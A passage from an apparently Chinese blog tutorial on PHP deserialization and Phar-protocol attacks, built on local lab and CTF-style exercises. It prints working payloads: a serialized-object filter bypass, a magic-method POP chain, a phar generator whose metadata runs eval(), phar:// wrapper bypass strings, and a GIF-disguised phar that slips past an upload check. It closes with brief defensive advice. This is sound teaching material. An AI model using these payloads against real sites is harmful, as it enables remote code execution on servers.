&quot;./&#123;$this-&gt;file&#125;&quot;;</span><br><span class="line">            if (file_get_contents($filename))</span><br><span class="line">            &#123;</span><br><span class="line">                return file_get_contents($filename);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;data&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $data = $_GET[&#x27;data&#x27;];</span><br><span class="line">    preg_match(&#x27;/[oc]:\d+:/i&#x27;,$data,$matches);</span><br><span class="line">    if(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#x27;Hacker!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        echo $good;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(&quot;./test4.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/1666013621550.png" alt="习题代码"></p>
+<p>2.解析:</p>
+<p>观察代码,上部分定义了类,下部分是过滤的代码,过滤后可以通过传参形式以反序列构造一个对象,然后将对象用字符串打印出来,触发上半部分的__toString()魔术方法,去执行预计代码。</p>
+<p>既然上半部分定义了类,下半部分只是过滤的代码,可以将上半部分抽离出来,查看序列化的结果,以便于反序列化</p>
+<p><img src="/images/1666013753336.png" alt="习题解析"></p>
+<p>3.同理,构造-&gt;序列化</p>
+<p><img src="/images/1666013841120.png" alt="习题解析"></p>
+<p>4.过滤:代码块中通过正则,不区分大小写的o,c字符,去匹配字符的冒号后的数字来做校验</p>
+<p><img src="/images/1666014009275.png" alt="过滤代码"></p>
+<p>5.可以通过+4等价代替 4 从而绕过检测(+  url编码为%2b)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  O:%2b4:&quot;baby&quot;:1:&#123;s:4:&quot;file&quot;;s:5:&quot;1.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666013969450.png" alt="绕过过滤"></p>
+<h4 id="四-开始上手"><a href="#四-开始上手" class="headerlink" title="四.开始上手"></a>四.开始上手</h4><p>任务:读取flag.GG的love</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>, <span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span> . <span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span> . <span class="string">&quot;GG的love&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>解析:</p>
+<p>涉及到对魔术方法的理解,需要回到初始部分,了解魔术方法的触发条件,建议依次由代码后头往前分析</p>
+<p><img src="/images/1666014602193.png" alt="习题解析"></p>
+<p><img src="/images/1666014651360.png" alt="习题解析"></p>
+<p><img src="/images/1666014675364.png" alt="习题解析"></p>
+<p><img src="/images/1666014675364.png" alt="习题解析"></p>
+<p><img src="/images/1666014708480.png" alt="习题解析"></p>
+<p><img src="/images/1666014760402.png" alt="习题解析"></p>
+<p><img src="/images/1666014780681.png" alt="习题解析"></p>
+<p>解题:</p>
+<p>代码构造: 通过 __construct()魔术方法,创建对象的时候自动调用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload</span><br><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new  B();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new  C();</span><br><span class="line">    &#125;</span><br><span class="line">    public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new  D();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($test2, $arr)</span><br><span class="line">    &#123;</span><br><span class="line">        $s1 = $this-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class D</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new  E();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod2 = &quot;字符串拼接&quot; . $this-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class E</span><br><span class="line">&#123;</span><br><span class="line">    public $str1;</span><br><span class="line">    public $str2;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str1 = new  GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str1-&gt;get_flag();</span><br><span class="line">        return &quot;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;flag:&quot; . &quot;GG的love&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new A;</span><br><span class="line">echo serialize($c);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload </span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;mod1&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;mod1&quot;;O:1:&quot;C&quot;:2:&#123;s:4:&quot;mod1&quot;;O:1:&quot;D&quot;:2:&#123;s:4:&quot;mod1&quot;;O:1:&quot;E&quot;:2:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;s:4:&quot;str2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实例化对象,输出序列化结果</p>
+<p><img src="/images/1666055855622.png" alt="输出序列化结果"></p>
+<p>结果</p>
+<p><img src="/images/1666056041793.png" alt="结果"></p>
+<p>总结:从习题中不难看出, 漏洞的主要的原因就是在反序列化的过程中，通过我们的恶意篡改会产生魔法函数绕过，字符逃逸，远程命令执行等漏洞。 </p>
+<h3 id="Phar文件和Phar协议"><a href="#Phar文件和Phar协议" class="headerlink" title="Phar文件和Phar协议"></a>Phar文件和Phar协议</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入unserialize()，随着代码安全性越来越高，利用难度也越来越大 假如没有unserialize(),没了传参接口那该怎么利用咧,这就需要 利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作 . 即通过本地构造phar文件把恶意代码本地序列化好,在将phar文件上传到目标网站,最后通过phar协议配合文件系统函数反序列化phar文件,达到预期目的.</span><br></pre></td></tr></table></figure>
+
+<h4 id="phar文件详解"><a href="#phar文件详解" class="headerlink" title="phar文件详解"></a>phar文件详解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Phar文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</span><br><span class="line">phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。</span><br></pre></td></tr></table></figure>
+
+<p>phar文件分为四层</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。</span><br><span class="line">//简单地说就是告诉系统自己是一个什么样的文件,声明文件后缀</span><br><span class="line"></span><br><span class="line">manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</span><br><span class="line">//存放序列化的内容</span><br><span class="line"></span><br><span class="line">content:被压缩文件的内容</span><br><span class="line"></span><br><span class="line">signature (可空):签名，放在末尾。</span><br></pre></td></tr></table></figure>
+
+<h4 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h4><h5 id="1-准备环境"><a href="#1-准备环境" class="headerlink" title="1.准备环境"></a>1.准备环境</h5><p>1.1Phar需要 PHP &gt;&#x3D; 5.2<br>1.2在php.ini中将phar.readonly设为Off（注意去掉前面的分号）</p>
+<p><img src="/images/1666090809497.png" alt="phpstudy配置"></p>
+<h5 id="2-具体代码"><a href="#2-具体代码" class="headerlink" title="2.具体代码:"></a>2.具体代码:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &#x27;phpinfo();&#x27;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$o = new AnyClass();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/1666090498354.png" alt="phar文件生成"></p>
+<p>①要序列化的内容,即起到的作用同上文练习题里的test.php文件一样,我们把要构造的恶意代码放进来进行序列化</p>
+<p>②上下部分的类命一致(其它选项可以保持默认)</p>
+<h5 id="2-1访问phar-php文件-生成phar-phar文件"><a href="#2-1访问phar-php文件-生成phar-phar文件" class="headerlink" title="2.1访问phar.php文件,生成phar.phar文件"></a>2.1访问phar.php文件,生成phar.phar文件</h5><p><img src="/images/1666090959788.png" alt="phar.phar文件生成"></p>
+<h5 id="2-2查看phar文件内容"><a href="#2-2查看phar文件内容" class="headerlink" title="2.2查看phar文件内容"></a>2.2查看phar文件内容</h5><p><img src="/images/1666091068301.png" alt="phar文件内容查看"></p>
+<p>总结:phar.phar文件是在我们本地生成,然后上传到目标网站,配合phar协议和相关函数,造成反序列的杀伤链.所以不用担心前置的开启phpstudy配置操作会影响后续操作.利用条件核心在于1.phar文件要能够上传到服务器端。2.要有可用的魔术方法作为“跳板”。3.文件操作函数的参数可控，且   .&#x2F;    ..&#x2F;    phar等特殊字符没有被过滤。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a>利用条件:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.phar文件要能够上传到服务器端。</span><br><span class="line">2.要有可用的魔术方法作为“跳板”。</span><br><span class="line">3.文件操作函数的参数可控，且   ./    ../    phar等特殊字符没有被过滤</span><br></pre></td></tr></table></figure>
+
+<h5 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h5><p>php大部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析phar文件时，都会将meta-data进行反序列化，知道创宇测试后发布的受影响的函数如下 :</p>
+<p><img src="/images/1666091518005.png" alt="文件操作函数"></p>
+<h4 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧:"></a>绕过技巧:</h4><h5 id="1-环境限制了phar不能出现在前面的字符里"><a href="#1-环境限制了phar不能出现在前面的字符里" class="headerlink" title="1.环境限制了phar不能出现在前面的字符里"></a>1.环境限制了phar不能出现在前面的字符里</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-验证文件格式"><a href="#2-验证文件格式" class="headerlink" title="2.验证文件格式"></a>2.验证文件格式</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-绕过上传后缀检查"><a href="#3-绕过上传后缀检查" class="headerlink" title="3.绕过上传后缀检查"></a>3.绕过上传后缀检查</h5><p>将phar.phar更名为phar.gif 不影响phar文件的最终执行</p>
+<p><img src="/images/1666091830216.png" alt="phar.gif"></p>
+<h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><h5 id="一-初步了解"><a href="#一-初步了解" class="headerlink" title="一.初步了解"></a>一.初步了解</h5><p>任务:目标1.php界面任务执行phpinfo()</p>
+<p>1.php代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Files</span><br><span class="line">&#123;</span><br><span class="line">    var $b = &#x27;echo ok;&#x27;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//$file = &#x27;../&#x27;.$_GET[&#x27;file&#x27;];</span><br><span class="line">is_dir(&#x27;phar://phar.phar/test.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666095753278.png" alt="1.php界面"></p>
+<p>解题:</p>
+<p>分析:存在可控点以及文件操作函数,路径指向phar协议.可以直接访问1.php文件,传参执行恶意的代码</p>
+<p>一  phar.php页面将恶意代码序列化</p>
+<p><img src="/images/1666096005482.png" alt="phar.phar文件生成"></p>
+<p>①保持类名一致</p>
+<p>②构造恶意代码</p>
+<p>③访问phar.php文件生成phar.phar文件</p>
+<p>④可以查看phar.phar文件(.metadata.bin放置着序列化的恶意代码)</p>
+<p>二.1.php页面执行phpinfo()</p>
+<p><img src="/images/1666095558119.png" alt="目标界面执行phpinfo"></p>
+<h5 id="二-进一步了解"><a href="#二-进一步了解" class="headerlink" title="二.进一步了解"></a>二.进一步了解</h5><p>通过phar协议读出Destruct called</p>
+<p>目标文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;Destruct called&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">file_get_contents($filename);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666094826497.png" alt="2.php"></p>
+<p>分析:存在可控点以及文件操作函数file_get_contents,需要通过phar协议的反序列化功能,配合file_get_contents函数,执行phar.phar文件内序列化后的代码</p>
+<p>1.同理,构造phar.phar文件,将恶意代码序列化存入phar.phar的.metadata.bin文件中</p>
+<p><img src="/images/1666098815001.png" alt="phar.phar文件生成"></p>
+<p>①保持类名一致</p>
+<p>②访问phar.php文件</p>
+<p>③生成phar.phar文件</p>
+<p>2.访问目标文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:phar://phar.phar/test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666098582374.png" alt="完成执行"></p>
+<h6 id="拓展-练习"><a href="#拓展-练习" class="headerlink" title="拓展:练习"></a>拓展:练习</h6><p>具体代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $num = 2;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;num === 1) &#123;</span><br><span class="line">            echo &#x27;flag&#123;123&#125;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo file_get_contents($_GET[&#x27;data&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>(关键在于构建恶意的代码,关注点在$num &#x3D; 2 —&gt;$num&#x3D;1)</p>
+<p><img src="/images/1666097212668.png" alt="拓展练习"></p>
+<h5 id="三-再进一步了解"><a href="#三-再进一步了解" class="headerlink" title="三.再进一步了解"></a>三.再进一步了解</h5><p>任务:通过phar协议执行phpinfo</p>
+<p>详细:通过upload_file.php,index.php,page.php文件模拟攻击目标,使用phar文件和phar协议执行反序列化,达到任意代码执行效果.</p>
+<h6 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h6><p>1.www&#x2F;目录(网站根目录)下放upload_file.php,index.php,page.php文件</p>
+<p>2.www&#x2F;目录(网站根目录)下新建upload_file文件夹</p>
+<p>3.各个文件内容及解释</p>
+<p>upload_file.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;</span><br><span class="line">    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class="line">    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line"></span><br><span class="line">    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">      &#123;</span><br><span class="line">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    else</span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">      &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">      echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;Invalid file,you can only upload gif&quot;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>upload_file.php:内容做了一个上传文件后缀的限制</p>
+<p><img src="/images/1666093061302.png" alt="upload_file.php"></p>
+<p>index.php 提供一个上传界面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://localhost/upload_file&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666093202839.png" alt="index.php"></p>
+<p>page.php 目标可控点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666093391170.png" alt="page.php"></p>
+<h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h6><p>1.目标存在可控点以及文件操作函数</p>
+<p><img src="/images/1666093580339.png" alt="page.php分析"></p>
+<p>2.只有upload_file.php的对上传文件的后缀限制</p>
+<p><img src="/images/1666094280884.png" alt="upload_file.php"></p>
+<h6 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h6><p>1.构造上传的phar文件</p>
+<p>①通过phar.php生成的phar.phar文件,将phar.phar文件更改为phar.gif文件</p>
+<p><img src="/images/1666093764231.png" alt="phar文件生成"></p>
+<p>2.上传文件和执行</p>
+<p>①成功上传②page页面成功执行phpinfo</p>
+<p><img src="/images/1666094091408.png" alt="page页面执行phpinfo"></p>
+<h4 id="反序列化漏洞的防御"><a href="#反序列化漏洞的防御" class="headerlink" title="反序列化漏洞的防御"></a>反序列化漏洞的防御</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">和大多数漏洞一样，反序列化的问题也是用户参数的控制问题引起的，所以最好的预防措施: </span><br><span class="line"></span><br><span class="line">1.  不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。</span><br><span class="line">2. 在进入反序列化函数之前,对参数进行限制过滤,例如长度等</span><br><span class="line">3.白名单为主,限制反序列化的类,从而减小影响</span><br><span class="line">4.鉴权，反序列化接口进行鉴权，仅允许后台管理员等特许人员才可调用</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://www.webgg.ml">木良</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.webgg.ml">https://www.webgg.ml</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">学累了就去喝杯奶茶呗.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">序列化与反序列化</a></div><div class="post_share"><div class="social-share" data-image="https://s1.ax1x.com/2022/10/13/xdGtOg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="添加&lt;--&gt;微信"/></a><div class="post-qr-code-desc">添加&lt;--&gt;微信</div></li><li class="reward-item"><a href="/img/wechat1.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat1.jpg" alt="朋友圈点个赞!"/></a><div class="post-qr-code-desc">朋友圈点个赞!</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2020/01/07/SQL/SQL%E7%9F%A5%E8%AF%86--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"><img class="next-cover" src="https://s1.ax1x.com/2022/10/13/xdGtOg.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SQL注入-个人笔记</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">PHP序列化与反序列化详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">序列化与反序列化</span></a><ol class="toc-child"><li 